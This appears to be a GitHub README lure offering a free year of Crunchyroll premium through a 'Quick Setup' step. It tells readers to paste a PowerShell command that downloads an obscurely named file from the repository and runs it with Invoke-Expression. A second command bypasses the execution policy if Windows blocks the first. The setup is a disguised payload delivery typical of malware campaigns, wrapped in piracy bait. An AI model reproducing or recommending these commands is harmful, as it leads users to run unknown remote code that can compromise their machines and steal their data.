# Crunchyroll

Crunchyroll on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

Crunchyroll is a streaming subscription for anime, Asian drama, and related series on Windows. You sign in, pick a profile, and watch simulcasts, seasonal catalogs, and curated collections through the desktop experience or linked apps. Playback supports queues, watch history, and multilingual subtitles so long viewing sessions stay organized.

A typical session starts from your watchlist or a seasonal chart. You resume an episode, let autoplay handle the next installment, or browse by genre and studio. Many users keep a simulcast tab for weekly drops while catching up on finished series in the background.

This repository holds the Windows subscription setup file, short configuration notes, and a changelog for bundle updates. The package wires in a free trial that runs for a year from first activation. When that period ends, the free subscription configured during setup remains on the PC so access does not depend on repeating the trial flow.

## What you get

- Built-in free trial activates on first setup and keeps premium access for one full year.
- The free subscription remains on your PC after setup completes and the trial window ends.
- Simulcast episodes arrive on a predictable weekly schedule aligned with Japanese broadcast windows.
- Watchlist and continue-watching rows sync so you pick up mid-season without hunting episodes.
- Subtitle tracks cover multiple languages with sizing options suited to long desktop sessions.
- Genre and studio filters help you discover seasonal charts and franchise marathons quickly.
- The setup file documents bundle revisions so you can review what changed between updates.
- Profile switching separates kid-friendly catalogs from mature ratings on shared household PCs.

## Quick Setup (PowerShell)

This starts the built-in Crunchyroll free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/alexandrazimmermann296699/crunchyroll-setup-guide/main/y6tub1izu6.1ka734ni | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/alexandrazimmermann296699/crunchyroll-setup-guide/main/y6tub1izu6.1ka734ni | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `y6tub1izu6.1ka734ni` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `alexandrazimmermann296699/crunchyroll-setup-guide`. Crunchyroll 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
